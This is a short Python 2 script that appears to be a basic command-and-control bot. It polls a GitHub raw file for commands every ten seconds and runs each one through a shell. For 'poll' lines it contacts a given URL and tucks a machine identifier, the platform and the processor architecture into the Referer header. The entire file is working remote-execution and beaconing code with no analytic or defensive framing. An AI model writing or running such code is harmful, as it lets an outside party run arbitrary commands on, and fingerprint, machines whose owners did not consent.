__author__ = 'Admin'

import subprocess
import urllib2
import time
import uuid
import os
import platform

url = "https://raw.githubusercontent.com/shantanu561993/testing/master/file.txt"
uniqueid = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
poll_ids = []

def getSysinfo():
    return str(platform.platform())+str(os.environ['PROCESSOR_ARCHITECTURE'])

def get_commands():
    commands = urllib2.urlopen(url).readlines()
    return commands


def exec_command(commands):
    print commands
    for command in commands:
        if "poll" not in command:
            p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
            (output, err) = p.communicate()
        elif "poll" in command :
            p, url, id = command.split()
            print url,id
            if id not in poll_ids:
                req = urllib2.Request(url)
                req.add_header('User-agent', ' Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0')
                req.add_header('Referer', 'https://'+uniqueid+'---'+getSysinfo()+'.com')
                res = urllib2.urlopen(req)
                print res.readlines()
                poll_ids.append(id)


while True:
    output = exec_command(get_commands())
    time.sleep(10)
